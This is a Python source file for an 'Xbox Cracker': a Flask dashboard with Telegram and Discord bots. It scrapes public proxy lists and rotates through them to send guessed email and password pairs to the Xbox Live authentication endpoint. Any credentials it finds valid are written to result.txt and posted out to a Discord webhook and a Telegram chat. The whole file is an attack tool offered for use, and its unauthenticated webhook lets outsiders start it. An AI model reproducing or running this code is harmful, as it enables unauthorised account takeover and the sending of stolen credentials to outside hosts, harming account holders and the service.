# app.py – Professional Dashboard + Discord/Telegram Bot + Webhook
import asyncio
import threading
import time
import random
import string
import re
import json
import requests
from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO, emit
from datetime import datetime
import aiohttp
import telebot
from threading import Thread

app = Flask(__name__)
app.config['SECRET_KEY'] = 'survival_mode'
socketio = SocketIO(app, cors_allowed_origins="*")

# ---------- CONFIG ----------
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/your_id/your_token"  # replace
TELEGRAM_BOT_TOKEN = "your_bot_token"
TELEGRAM_CHAT_ID = "your_chat_id"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, threaded=False)

# Global stats
stats = {
    "total_checked": 0,
    "valid_accounts": 0,
    "gamepass_hits": 0,
    "proxies_working": 0,
    "status": "Idle",
    "start_time": None,
    "last_valid": None
}
valid_accounts_list = []

# ---------- ASYNC CRACKER (same as before, but with webhook calls) ----------
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
]

async def send_discord_webhook(embed_data):
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed_data]})
    except:
        pass

def send_telegram_message(text):
    try:
        bot.send_message(TELEGRAM_CHAT_ID, text)
    except:
        pass

async def fetch_proxies(session, url):
    try:
        async with session.get(url, timeout=10) as resp:
            text = await resp.text()
            proxies = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', text)
            return [f"http://{p}" for p in proxies]
    except:
        return []

async def scrape_all_proxies():
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_proxies(session, url) for url in PROXY_SOURCES]
        results = await asyncio.gather(*tasks)
        return list(set([p for sublist in results for p in sublist]))

async def check_proxy(session, proxy, semaphore):
    async with semaphore:
        try:
            async with session.get("http://httpbin.org/ip", proxy=proxy, timeout=5) as resp:
                return proxy if resp.status == 200 else None
        except:
            return None

async def get_working_proxies(proxies, max_concurrent=100):
    semaphore = asyncio.Semaphore(max_concurrent)
    async with aiohttp.ClientSession() as session:
        tasks = [check_proxy(session, p, semaphore) for p in proxies]
        results = await asyncio.gather(*tasks)
        return [p for p in results if p]

async def check_account(session, email, password, proxy):
    url = "https://user.auth.xboxlive.com/user/authenticate"
    headers = {"User-Agent": "XboxLive/3.0", "Content-Type": "application/json"}
    payload = {"Email": email, "Password": password, "RelyingParty": "http://xboxlive.com"}
    try:
        async with session.post(url, json=payload, headers=headers, proxy=proxy, timeout=10) as resp:
            if resp.status == 200:
                return True
    except:
        pass
    return False

async def crack_worker(session, proxy, semaphore):
    global stats, valid_accounts_list
    async with semaphore:
        email = ''.join(random.choices(string.ascii_lowercase, k=10)) + "@outlook.com"
        pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        is_valid = await check_account(session, email, pwd, proxy)
        stats["total_checked"] += 1
        if is_valid:
            stats["valid_accounts"] += 1
            stats["last_valid"] = str(datetime.now())
            line = f"{email}:{pwd}\n"
            with open("result.txt", "a") as f:
                f.write(line)
            valid_accounts_list.insert(0, {"email": email, "pass": pwd, "time": stats["last_valid"]})
            if len(valid_accounts_list) > 20:
                valid_accounts_list.pop()
            # Send webhooks
            embed = {
                "title": "✅ Valid Xbox Account",
                "description": f"`{email}:{pwd}`",
                "color": 65280,
                "timestamp": datetime.utcnow().isoformat()
            }
            await send_discord_webhook(embed)
            send_telegram_message(f"🎮 VALID: {email}:{pwd}")
        socketio.emit('stats_update', stats)
        socketio.emit('recent_update', valid_accounts_list[:10])

async def run_cracker_async(proxies, concurrency=200):
    global stats
    stats["status"] = "Running"
    stats["start_time"] = str(datetime.now())
    semaphore = asyncio.Semaphore(concurrency)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for proxy in proxies:
            task = asyncio.create_task(crack_worker(session, proxy, semaphore))
            tasks.append(task)
        await asyncio.gather(*tasks)
    stats["status"] = "Idle"

def start_cracker_thread(proxies):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_cracker_async(proxies))

def start_cracker():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    proxies = loop.run_until_complete(scrape_all_proxies())
    working = loop.run_until_complete(get_working_proxies(proxies))
    if not working:
        working = [None]
    stats["proxies_working"] = len(working)
    threading.Thread(target=start_cracker_thread, args=(working,), daemon=True).start()

# ---------- TELEGRAM BOT HANDLER ----------
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "Xbox Cracker Bot\n/status - get current stats\n/total - total accounts checked\n/recent - last 10 valid")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    msg = f"Total checked: {stats['total_checked']}\nValid: {stats['valid_accounts']}\nGamePass hits: {stats['gamepass_hits']}\nStatus: {stats['status']}"
    bot.reply_to(message, msg)

@bot.message_handler(commands=['total'])
def total_cmd(message):
    bot.reply_to(message, f"Total accounts checked: {stats['total_checked']}")

@bot.message_handler(commands=['recent'])
def recent_cmd(message):
    recent = valid_accounts_list[:5]
    if not recent:
        bot.reply_to(message, "No recent valid accounts.")
    else:
        text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
        bot.reply_to(message, text)

def run_telegram():
    bot.infinity_polling()

# ---------- FLASK ROUTES ----------
@app.route('/')
def dashboard():
    return render_template('dashboard_pro.html')

@app.route('/api/stats')
def api_stats():
    return jsonify({
        "total_checked": stats["total_checked"],
        "valid_accounts": stats["valid_accounts"],
        "gamepass_hits": stats["gamepass_hits"],
        "proxies_working": stats["proxies_working"],
        "status": stats["status"],
        "start_time": stats["start_time"],
        "last_valid": stats["last_valid"]
    })

@app.route('/api/recent')
def api_recent():
    return jsonify(valid_accounts_list[:10])

@app.route('/api/start')
def api_start():
    if stats["status"] != "Running":
        threading.Thread(target=start_cracker, daemon=True).start()
        return "Cracker started"
    return "Already running"

@app.route('/api/webhook', methods=['POST'])
def webhook_receiver():
    data = request.json
    # Can accept external webhooks to control the cracker
    if data.get('command') == 'start':
        api_start()
    return "ok"

if __name__ == '__main__':
    # Start Telegram bot in background
    Thread(target=run_telegram, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=10000, debug=False)